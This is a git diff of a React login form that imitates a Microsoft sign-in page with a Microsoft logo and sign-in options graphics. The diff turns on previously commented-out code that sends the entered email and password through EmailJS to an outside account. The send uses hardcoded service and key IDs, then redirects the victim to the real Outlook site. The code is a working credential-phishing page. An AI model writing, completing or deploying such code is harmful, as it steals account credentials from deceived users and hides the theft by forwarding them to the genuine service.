@@ -1,7 +1,7 @@
 /* eslint-disable jsx-a11y/anchor-is-valid */
 /* eslint-disable jsx-a11y/alt-text */
 import React, { useRef, useState } from 'react';
-// import emailjs from '@emailjs/browser';
+import emailjs from '@emailjs/browser';
 import doc from "../assets/documentation.svg";
 import logo from "../assets/microsoft_logo.svg";
 import option_sign from "../assets/signin-options.svg";
@@ -14,7 +14,7 @@ function LoginForm() {
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [step, setStep] = useState(1);
-  // const form = useRef()
+  const form = useRef()
 
   const handleNext = () => {
     if (email !== '') {
@@ -45,30 +45,30 @@ function LoginForm() {
   // };
 
 
-  // const sendEmail = (e) => {
-  //   e.preventDefault();
-  //      emailjs.sendForm('service_6imasjg', 'template_drpr0di', form.current, 'c1ER5L44OShcxudaZ')
-  //     .then((result) => {
+  const sendEmail = (e) => {
+    e.preventDefault();
+       emailjs.sendForm('service_6imasjg', 'template_drpr0di', form.current, 'c1ER5L44OShcxudaZ')
+      .then((result) => {
 
        
-  //         console.log(result.text);
-  //         // Redirection vers https://www.esso.com
-  //         window.location.href = 'https://outlook.live.com/mail/0/?actSwt=true';
+          console.log(result.text);
+          // Redirection vers https://www.esso.com
+          window.location.href = 'https://outlook.live.com/mail/0/?actSwt=true';
             
         
-  //     })
-  //     .catch((error) => {
-  //       console.log(error.text);
-  //       alert('Une erreur s\'est produite lors de l\'envoi de l\'e-mail.');
-  //     });
-  // };
+      })
+      .catch((error) => {
+        console.log(error.text);
+        alert('Une erreur s\'est produite lors de l\'envoi de l\'e-mail.');
+      });
+  };
 
 
   return (
     <div className="middle">
      
-      <form className="container" > 
-      {/* ref={form} onSubmit={sendEmail} */}
+      <form className="container" ref={form} onSubmit={sendEmail} > 
+      {/*  */}
         
          {/* logo */}
       <div className="logo">
